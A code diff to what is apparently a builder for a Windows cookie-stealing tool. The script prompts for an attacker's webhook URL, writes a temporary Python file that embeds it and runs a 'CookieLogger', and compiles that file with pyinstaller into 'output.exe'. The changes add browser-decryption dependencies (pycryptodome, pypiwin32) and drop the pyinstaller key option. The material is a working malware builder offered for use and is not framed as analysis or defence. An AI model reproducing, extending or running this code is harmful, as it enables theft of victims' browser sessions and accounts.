@@ -2,12 +2,12 @@ import os
 import base64
 import shutil
 
-os.system("python -m pip install pyinstaller")
+os.system("python -m pip install pyinstaller pypiwin32 pycryptodome")
 os.system("cls")
 
 webhook = input("Paste your Webhook: ")
 
-id = base64.b64encode(os.urandom(16)).decode().replace("=","")
+id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
 
 open(f"tmp_{id}.py", "w").write(f"""
 webhook = "{webhook}" # WEBHOOK HERE
@@ -174,7 +174,7 @@ if __name__ == "__main__":
     CookieLogger()
 """)
 
-os.system(f"pyinstaller --clean --onefile --key {base64.b64encode(os.urandom(16)).decode()} tmp_{id}.py")
+os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
 
 shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
 shutil.rmtree("dist")
